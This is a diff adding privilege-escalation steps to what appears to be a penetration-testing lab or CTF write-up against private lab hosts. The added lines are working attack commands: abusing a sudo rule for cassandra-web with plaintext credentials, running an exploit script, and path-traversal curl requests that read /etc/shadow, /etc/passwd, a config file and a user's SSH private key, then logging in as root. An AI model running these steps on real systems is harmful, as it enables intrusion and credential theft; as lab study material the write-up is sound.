@@ -199,6 +199,39 @@ root
 
 # root
 ```
+# More Privesc
+## Method II
+```bash
+sudo -l
+(ALL) NOPASSWD: /usr/local/bin/cassandra-web
+
+# Start cassandra-web as root
+sudo cassandra-web -B 0.0.0.0:7777 -u cassie -p SecondBiteTheApple330
+- Now cassandra-web runs on port 7777
+- But accessible only internally 
+- can port forward or move the exploit 49362.py to /tmp on 192.168.203.240 Machine and run exploit to view sensitive files as root
+
+# PrivEsc
+python3 49362.py 127.0.0.1 -p 7777 /etc/shadow
+python3 49362.py 127.0.0.1 -p 7777 /home/anthony/.ssh/id_rsa
+
+# Use the private key and login 
+- anothony unable to login with private key
+- able to use the private key as root 
+
+sudo ssh -i anthony.key root@$ip
+# root
+```
+## Method III
+```bash
+# using curl
+curl http://192.168.120.155:3000/../../../../../../../../etc/passwd --path-as-is
+curl http://192.168.120.155:3000/../../../../../../../../proc/self/cmdline --path-as-is
+curl http://192.168.120.155:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml --path-as-is
+
+sudo cassandra-web -B 0.0.0.0:7777 -u cassie -p SecondBiteTheApple330
+curl localhost:7777/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is
+```
 # ENUMERATION OUTPUTS
 ## NMAP
 ```bash
